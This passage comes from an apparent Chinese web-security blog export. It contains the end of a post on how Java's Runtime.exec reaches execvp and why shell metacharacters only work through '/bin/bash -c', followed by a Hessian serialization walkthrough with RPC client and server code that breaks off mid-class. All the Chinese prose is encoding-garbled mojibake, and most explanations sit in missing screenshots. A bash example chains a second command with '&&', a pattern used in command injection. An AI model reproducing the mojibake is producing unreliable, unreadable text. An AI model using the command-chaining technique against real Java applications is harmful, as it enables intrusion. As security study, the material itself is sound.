<p><img src="1577887148131-a6992150-ab3e-4e82-a93c-c5927f254965.png#align=left&display=inline&height=177&name=image.png&originHeight=292&originWidth=1230&size=31775&status=done&style=none&width=746" alt="image.png"></p>
<p><img src="1577887164428-ce737fbd-2e40-4702-820a-d45b23fa2954.png#align=left&display=inline&height=212&name=image.png&originHeight=354&originWidth=1244&size=39562&status=done&style=none&width=746" alt="image.png"></p>
<p>æ•…æ•°ç»„æƒ…å†µä¸‹ç­‰ä»·äº<br><img src="1577774188360-408cc7a4-bffe-4360-a859-f6e5b6b20a4f.png#align=left&display=inline&height=310&name=image.png&originHeight=620&originWidth=2246&size=111327&status=done&style=none&width=1123" alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å†æ¥è€ƒå¯Ÿä¸€ä¸‹ï¼Œå­—ç¬¦ä¸²çš„æƒ…å†µçš„æƒ…å†µã€‚<br><img src="1577892353386-8b9d3cb5-d1a0-4c85-bd25-555f2dc45f04.png#align=left&display=inline&height=123&name=image.png&originHeight=202&originWidth=1226&size=21350&status=done&style=none&width=746" alt="image.png"><br><img src="1577892370784-45fd9581-4a77-41b5-99c3-70031f64f1f0.png#align=left&display=inline&height=121&name=image.png&originHeight=200&originWidth=1228&size=21627&status=done&style=none&width=746" alt="image.png"><br><img src="1577892391866-8b0b4576-a0c0-403b-8c41-13a8848e700b.png#align=left&display=inline&height=116&name=image.png&originHeight=192&originWidth=1234&size=22711&status=done&style=none&width=746" alt="image.png"><br><img src="1577892410406-82bd1a5c-7106-4077-ac07-fa9cb05d972b.png#align=left&display=inline&height=120&name=image.png&originHeight=190&originWidth=1182&size=21050&status=done&style=none&width=746" alt="image.png"><br><img src="1577892490628-2810628a-be2b-4db9-90e9-2845970634e4.png#align=left&display=inline&height=114&name=image.png&originHeight=184&originWidth=1206&size=20774&status=done&style=none&width=746" alt="image.png"><br><img src="1577892526498-a9e7e761-b5af-452f-82db-cf194e00d3bf.png#align=left&display=inline&height=114&name=image.png&originHeight=190&originWidth=1244&size=22425&status=done&style=none&width=746" alt="image.png"><br><img src="1577892558443-d47b918c-5559-47e7-b68b-8af7db6aec8e.png#align=left&display=inline&height=123&name=image.png&originHeight=202&originWidth=1230&size=22185&status=done&style=none&width=746" alt="image.png"></p>
<p>æ•…å­—ç¬¦ä¸²æ¨¡å¼ç­‰ä»·äº</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *arg[] = &#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"'echo"</span>, <span class="string">"2333"</span>, <span class="string">"&amp;&amp;"</span>, <span class="string">"echo"</span>, <span class="string">"2333'"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execvp(arg[<span class="number">0</span>],(<span class="keyword">char</span> **) arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="1577774099636-86487450-9203-4284-ba2c-d16a7e1297c8.png#align=left&display=inline&height=326&name=image.png&originHeight=652&originWidth=2692&size=136647&status=done&style=none&width=1346" alt="image.png"></p>
<p>æ‰€ä»¥æ•´ä¸ªè°ƒç”¨é“¾å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.Runtime.exec(cmd);</span><br><span class="line">-&gt;java.lang.ProcessBuilder.start();</span><br><span class="line">--&gt;java.lang.ProcessImpl.start();</span><br><span class="line">---&gt;Java_java_lang_UNIXProcess_forkAndExec() in j2se&#x2F;src&#x2F;solaris&#x2F;native&#x2F;java&#x2F;lang&#x2F;UNIXProcess_md.c</span><br><span class="line">----&gt;forkæˆ–VFORKæˆ–POSIX_SPAWN</span><br><span class="line">-----&gt;execvp();</span><br></pre></td></tr></table></figure>

<h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><p>_Runtime.getRuntime().execæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™å¹¶æ²¡æœ‰shellä¸Šä¸‹æ–‡ç¯å¢ƒæ‰€ä»¥æ— æ³•æŠŠç±»ä¼¼äº <code>&amp;</code> <code>|</code> <em>`</em><code>_</code> _è¿™æ ·çš„ç¬¦å·ç‰¹æ®Šå¤„ç†_çš„æœ¬è´¨æ˜¯execvpä¹Ÿç¡®å®ä¸æ”¯æŒshellä¸­çš„ç‰¹æ®Šç¬¦å·ã€‚è€Œä¹‹æ‰€ä»¥æ•°ç»„æƒ…å†µèƒ½æˆæ˜¯å› ä¸ºexecvpè°ƒç”¨äº† <code>/bin/bash</code> ï¼Œ<code>/bin/bash</code> è§£é‡Šäº† <code>&amp;</code> , <code>|</code> è¿™äº›ç‰¹æ®Šç¬¦å·å’Œexecvpæ²¡å…³ç³»ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Javaä¸‹å¥‡æ€ªçš„å‘½ä»¤æ‰§è¡Œ</a><br><a href="https://mp.weixin.qq.com/s/zCe_O37rdRqgN-Yvlq1FDg">åœ¨ Runtime.getRuntime().exec(String cmd) ä¸­æ‰§è¡Œä»»æ„shellå‘½ä»¤çš„å‡ ç§æ–¹æ³•</a><br><a href="https://www.cnblogs.com/LittleHann/p/4326828.html">Java JVMã€JNIã€Native Function Interfaceã€Create New Process Native Function API Analysis</a><br><a href="https://stackoverflow.com/questions/36221038/how-to-debug-a-forked-child-process-using-clion">How to debug a forked child process using CLion</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Hessian åºåˆ—åŒ–ä»£ç åˆ†æåŠä¸šåŠ¡åœºæ™¯å­¦ä¹ </title>
    <url>/2020/01/03/Hessian-%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<!-- Hessianæ˜¯ä¸€ä¸ªè½»é‡çº§çš„remotingonhttpå·¥å…·ï¼Œä½¿ç”¨ç®€å•çš„æ–¹æ³•æä¾›äº†RMIçš„åŠŸèƒ½ -->
<!-- more -->
<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>Hessianæ˜¯ä¸€ä¸ªè½»é‡çº§çš„remotingonhttpå·¥å…·ï¼Œä½¿ç”¨ç®€å•çš„æ–¹æ³•æä¾›äº†RMIçš„åŠŸèƒ½ã€‚æ—©åœ¨08å¹´æœ‰äººåšè¿‡æµ‹è¯•ï¼šä¸€ä¸ªUserDataç±»ï¼Œæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²å±æ€§ï¼Œä¸€ä¸ªæ—¥æœŸå±æ€§,ä¸€ä¸ªdoubleå±æ€§ï¼Œåˆ†åˆ«ç”¨java,hessianæ¥åºåˆ—åŒ–ä¸€ç™¾ä¸‡æ¬¡,ç»“æœè®©äººåƒæƒŠ,ä¸æ­¢æ˜¯hessianåºåˆ—åŒ–çš„é€Ÿåº¦è¦æ¯”javaçš„å¿«ä¸Šä¸€å€ï¼Œè€Œä¸”hessianåºåˆ—åŒ–åçš„å­—èŠ‚æ•°ä¹Ÿè¦æ¯”javaçš„å°‘ä¸€å€ã€‚</p>
<h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><p>åºåˆ—åŒ–å®è§‚æ¥çœ‹å°±å››æ­¥</p>
<ol>
<li>å»ºç«‹è¿›è¡Œåºåˆ—åŒ–çš„å·¥å‚ç±»</li>
<li>ç”¨å·¥å‚ç±»æ‰¾åˆ°è¦è¦è¿›è¡Œåºåˆ—åŒ–ç±»å¯¹åº”çš„åºåˆ—åŒ–å™¨</li>
<li>åºåˆ—åŒ–å™¨å¯¹å°†è¿›è¡Œåºåˆ—åŒ–çš„å¯¹è±¡è¿›è¡Œå†…çœ</li>
<li>å†…çœå®Œæˆåè°ƒç”¨åºåˆ—åŒ–å™¨çš„writeObjectï¼ˆwriteObjectä¸­æŒ‰ç…§ä¸€å®šè§„åˆ™æŠŠæ•°æ®å†™å…¥byteæµï¼‰</li>
</ol>
<p>ä¸‹é¢ç”¨Hessianç®€å•åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ¥çœ‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    User() &#123;</span><br><span class="line">        age = <span class="number">18</span>;</span><br><span class="line">        name = <span class="string">"cl0und"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HessianTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        ByteArrayOutputStream os=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        HessianOutput output=<span class="keyword">new</span> HessianOutput(os);</span><br><span class="line">        output.writeObject(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å»ºç«‹è¿›è¡Œåºåˆ—åŒ–çš„å·¥å‚ç±»"><a href="#å»ºç«‹è¿›è¡Œåºåˆ—åŒ–çš„å·¥å‚ç±»" class="headerlink" title="å»ºç«‹è¿›è¡Œåºåˆ—åŒ–çš„å·¥å‚ç±»"></a>å»ºç«‹è¿›è¡Œåºåˆ—åŒ–çš„å·¥å‚ç±»</h3><p>æŠŠByteArrayOutputStreamæ”¾å…¥äº†HessianOutputä¸­å…¸å‹çš„è£…é¥°å™¨æ¨¡å¼ã€‚<br><img src="1578018650932-4f7b0b12-c08d-49fd-9b13-a106a7241095.png" alt="image.png"></p>
<p>æ–°å»ºåºåˆ—å·¥å‚ç±»ï¼ˆåç»­ä¼šé€šè¿‡å·¥å‚ç±»æ¥å¯»æ‰¾ç±»çš„å¯¹åº”åºåˆ—åŒ–å™¨ï¼‰ã€‚<br><img src="1578018510750-27953aaa-dcd1-4479-9534-9324d5dbaef7.png" alt="image.png"></p>
<p>å·¥å‚ç±»çš„åˆ›å»ºè¿‡ç¨‹ä¸­ï¼Œåœ¨ç±»é™æ€å—ä¸­åŠ å…¥äº†javaå„ç§ç±»å‹çš„ååºåˆ—å™¨ä»¥åŠå’ŒHessianæœ‰å…³çš„ååºåˆ—å™¨ã€‚è¿™é‡Œå’Œåºåˆ—åŒ–æ²¡å…³ç³»ï¼Œåªæ˜¯æä¸€å˜´ã€‚<img src="1578056872628-e9e64d41-63d6-4a29-851e-31f645c46dcb.png" alt="image.png"></p>
<p>åœ¨ç±»åˆå§‹åŒ–å®Œæˆåï¼Œæ­£å¼è¿›å…¥SerializerFactoryçš„æ„é€ æ–¹æ³•ã€‚å¯ä»¥çœ‹åˆ°SerializerFactoryå…è®¸ä¸å®‰å…¨çš„åºåˆ—åŒ–ï¼Œè®¾ç½®é»˜è®¤çš„ä¸Šä¸‹æ–‡å·¥å‚ç±»æ˜¯_contextFactoryï¼Œè¿™ä¸ª_contextFactoryæ˜¯ç”Ÿäº§åºåˆ—åŒ–å™¨çš„å·¥å‚ã€‚<br><img src="1578018782918-44d51486-ba54-496b-b388-08cce55da23f.png" alt="image.png"></p>
<p><img src="1578020378163-c8312b90-7712-4eee-9793-98befa59ba79.png" alt="image.png"></p>
<h3 id="ç”¨å·¥å‚ç±»æ‰¾åˆ°è¦è¦è¿›è¡Œåºåˆ—åŒ–ç±»å¯¹åº”çš„åºåˆ—åŒ–å™¨"><a href="#ç”¨å·¥å‚ç±»æ‰¾åˆ°è¦è¦è¿›è¡Œåºåˆ—åŒ–ç±»å¯¹åº”çš„åºåˆ—åŒ–å™¨" class="headerlink" title="ç”¨å·¥å‚ç±»æ‰¾åˆ°è¦è¦è¿›è¡Œåºåˆ—åŒ–ç±»å¯¹åº”çš„åºåˆ—åŒ–å™¨"></a>ç”¨å·¥å‚ç±»æ‰¾åˆ°è¦è¦è¿›è¡Œåºåˆ—åŒ–ç±»å¯¹åº”çš„åºåˆ—åŒ–å™¨</h3><p>æ ¹æ®ä¼ å…¥ç±»å‹è·å–ç›¸åº”çš„åºåˆ—åŒ–å™¨ã€‚<br><img src="1578018871570-0e8cbc5b-bc58-460c-b6d2-d44fac4f9232.png" alt="image.png"></p>
<p>è·å–åºåˆ—åŒ–å™¨çš„è§„åˆ™æ˜¯å¦‚æœ_cachedSerializerMapé‡Œé¢åˆå°±ç›´æ¥ä»é‡Œé¢å–ï¼Œå¦‚æœæ²¡æœ‰å°±ç”¨loadSerializeræ‰¾ï¼Œæ‰¾å‡ºæ¥çš„åŠ å…¥_cachedSerializerMapé¿å…äºŒæ¬¡åŠ è½½ã€‚<br><img src="1578018931958-a405efcd-b970-48fc-a579-6ab9dd9adbd5.png" alt="image.png"></p>
<p>loadSerializeræ‰¾çš„é€»è¾‘æ˜¯å…ˆçœ‹æœ‰æ²¡æœ‰å…¶å®ƒå·¥å‚ç±»ï¼Œå¦‚æœæœ‰å°±ç”¨ï¼Œå¦‚æœæ²¡æœ‰å°±ç”¨_contextFactoryé€ ã€‚<br><img src="1578019332986-acb7d611-ab63-4eab-9417-1595a87e8f89.png" alt="image.png"></p>
<p>å› ä¸ºUseræ˜¯è‡ªå»ºç±»å‹_contextFactoryé€ ä¸å‡ºå¯¹åº”åºåˆ—åŒ–å™¨ã€‚<br><img src="1578020722501-2751e375-f821-4b90-a060-d4a89929b36f.png" alt="image.png"></p>
<p>ä¸‹ä¸€æ­¥å°è¯•getCustomSerializeræ¥æ‰¾åºåˆ—åŒ–å™¨ï¼Œçœ‹æ–¹æ³•çš„æ„æ€åº”è¯¥æ˜¯æ‰¾æ˜¯å¦æœ‰å®¢æˆ·è‡ªå·±å®šåˆ¶çš„åºåˆ—åŒ–å™¨ã€‚ç”Ÿæˆåºåˆ—å™¨è§„åˆ™æ˜¯ï¼šå¦‚æœ_customSerializerMapæœ‰å°±ç›´æ¥è¿”å›ï¼Œå¦‚æœæ²¡æœ‰å°±æŒ‰ç…§_ç±»å+HessianSerializer_çš„è§„åˆ™æ¥æ‰¾ã€‚å¾ˆé—æ†¾æˆ‘ä»¬å¹¶æ²¡æœ‰å¯¹Useråšä¸ªæ€§åŒ–å®šåˆ¶ã€‚<br><img src="1578020850955-a7f2fca3-0f4d-4446-8c74-78584c1adcfe.png" alt="image.png"></p>
<p>å› ä¸ºæ²¡æœ‰æˆ‘ä»¬æ²¡æœ‰å¯¹Useråšä¸ªæ€§åŒ–çš„åºåˆ—åŒ–å™¨ï¼Œæ‰€ä»¥æœ€åä¼šè°ƒç”¨getDefaultSerializeræ¥è¿”å›é»˜è®¤åºåˆ—åŒ–å™¨ã€‚åˆå› ä¸ºUseræ—¢ä¸æ˜¯å†…ç½®ç±»ä¹Ÿä¸æ˜¯å’Œhessianæœ‰å…³çš„ç‰¹æ®Šç±»ä½†æ˜¯å…è®¸äº†ä¸å®‰å…¨çš„åºåˆ—åŒ–ï¼Œæ‰€ä»¥æœ€åè¢«é€‰ä¸­çš„åºåˆ—åŒ–å™¨æ˜¯UnsafeSerializerã€‚<br><img src="1578036755615-9fda6962-c2ee-4250-ae0d-bf9ac12f1573.png" alt="image.png"></p>
<h3 id="åºåˆ—åŒ–å™¨å¯¹åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œå†…çœ"><a href="#åºåˆ—åŒ–å™¨å¯¹åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œå†…çœ" class="headerlink" title="åºåˆ—åŒ–å™¨å¯¹åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œå†…çœ"></a>åºåˆ—åŒ–å™¨å¯¹åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œå†…çœ</h3><p>åœ¨æ„é€ æ–¹æ³•ä¸­ä½¿ç”¨introspectè¿›è¡Œå†…çœã€‚<br><img src="1578022299793-2d917569-2b48-4a40-b641-1f7dbd68d54d.png" alt="image.png"></p>
<p><img src="1578022661148-31eaa214-4623-4d53-8c03-d54625986822.png" alt="image.png"></p>
<p>introspectæœ€åå‡ æ­¥æ˜¯åœ¨ä¸ºç±»é‡Œé¢çš„å±æ€§æ‰¾åºåˆ—åŒ–å™¨ï¼ˆgetFiledSerializerï¼‰ã€‚<br><img src="1578026402777-b2f40c49-d717-475e-9874-d7244f823d85.png" alt="image.png"></p>
<p>æ¯”å¦‚è¿™é‡ŒUserç±»ä¸­nameå±æ€§æ˜¯Stringï¼Œå°±åˆ›å»ºé’ˆå¯¹Stringçš„åºåˆ—åŒ–å™¨ã€‚<br><img src="1578026468907-63b0955a-6cb0-4fde-b2b8-079ec936e618.png" alt="image.png"></p>
<p>Stringçš„åºåˆ—åŒ–å™¨åŒ…å«äº†fieldç±»åŠå…¶åç§»é‡ã€‚<br><img src="1578035822247-43e9dad1-3122-4c40-861c-9f05f0346dc2.png" alt="image.png"></p>
<p>åˆ›å»ºç±»åŠåŠå…¶å­—æ®µåºåˆ—åŒ–å™¨åä¸€è·¯å‘å¤–ä¼ ï¼Œç„¶åè°ƒç”¨writeObjectã€‚<br><img src="1578054376515-e69a20a8-3ee8-4a8e-9a16-f422e144c663.png" alt="image.png"></p>
<p><img src="1578054878060-3ec4b6c4-b62d-44e3-b0af-76d33c0a5385.png" alt="image.png"></p>
<p>writeObjectBegin å†™äº†Objectçš„é­”æœ¯å¤´ã€é•¿åº¦ã€ç±»å<br><img src="1578059835151-a62d0cba-183f-44b6-85e2-a59c69e2cb89.png" alt="image.png"><br><img src="1578059865287-b2958526-3372-450b-90c6-3900ad380034.png" alt="image.png"><br>writeObject10 è´Ÿè´£åºåˆ—åŒ–å­—æ®µ<br><img src="1578055007325-a2d4943e-0e7a-41e5-b9ce-2b92ccf5ed7e.png" alt="image.png"></p>
<p>å…ˆæ˜¯å†™è¦åºåˆ—åŒ–çš„å­—ç¬¦ä¸²é­”æœ¯å€¼ã€å­—æ®µåé•¿åº¦ã€å­—æ®µåï¼Œå…¶ä¸­ <code>os.write(83)</code> ä»£è¡¨ <code>S</code> ä»£è¡¨å­—ç¬¦ä¸²ã€‚<img src="1578055257437-7c63a33c-2d8b-4e64-971b-c70f9519f5dc.png" alt="image.png"></p>
<p>Stringç±»å‹å­¦åºåˆ—åŒ–çš„æ—¶å€™<br><img src="1578055611722-af337b28-b489-4381-80b9-831a7fa87df4.png" alt="image.png"><br><img src="1578055873704-aa60f07f-6ba7-4cc8-9727-bec3787f9861.png" alt="image.png"></p>
<p>intç±»å‹åºåˆ—åŒ–çš„æ—¶å€™<br><img src="1578055767135-360790fd-1b05-4b4c-a963-ffc97ca83946.png" alt="image.png"><br><img src="1578055703641-922968f1-89be-4dae-8423-5fcf0cb4f734.png" alt="image.png"></p>
<p>æœ€åçš„ç»“æœ<br><img src="1578059987421-90e3ff15-6b85-448e-9785-a08152c6ef01.png" alt="image.png"></p>
<h2 id="ä¸šåŠ¡åœºæ™¯"><a href="#ä¸šåŠ¡åœºæ™¯" class="headerlink" title="ä¸šåŠ¡åœºæ™¯"></a>ä¸šåŠ¡åœºæ™¯</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>è¯´ç©¿äº†å°±æ˜¯RPCï¼Œç”¨å®é™…çš„ä»£ç æ¥çœ‹çœ‹<br>pom.xmlåŠ å…¥</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.60<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HessianServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.caucho.hessian.server.HessianServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>service-class<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>org.syclover.hessian.BasicService<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HessianServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/api/service<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»£ç å¿˜è®°ä»ç½‘ä¸Šå“ªé‡Œcopyçš„äº†ï¼Œä¾µåˆ ã€‚</p>
<p>client/serverç«¯å…±æœ‰ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IBasicApi</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* è®¾ç½®ç”¨æˆ·å */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">setUserName</span><span class="params">(String name)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* è·å–é—®å€™ */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* è·å–ç”¨æˆ·ä¿¡æ¯ */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>clientç«¯ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://localhost:8080/hessianTest_war_exploded/api/service"</span>;</span><br><span class="line">        HessianProxyFactory factory = <span class="keyword">new</span> HessianProxyFactory();</span><br><span class="line">        IBasicApi api = (IBasicApi) factory.create(IBasicApi<span class="class">.<span class="keyword">class</span>, <span class="title">url</span>)</span>;</span><br><span class="line">        api.setUserName(<span class="string">"mahc"</span>);</span><br><span class="line">        System.out.println(api.sayHello());</span><br><span class="line">        System.out.println(api.getUser().getName());</span><br><span class="line">        System.out.println(api.getUser().getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>serverç«¯ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.syclover.hessian.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BasicService</span> <span class="keyword">implements</span> <span class="title">IBasicApi</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">setUserName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + name + <span class="string">",Welcome to Hessian!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(name, <span class="number">23</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name, Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.name = 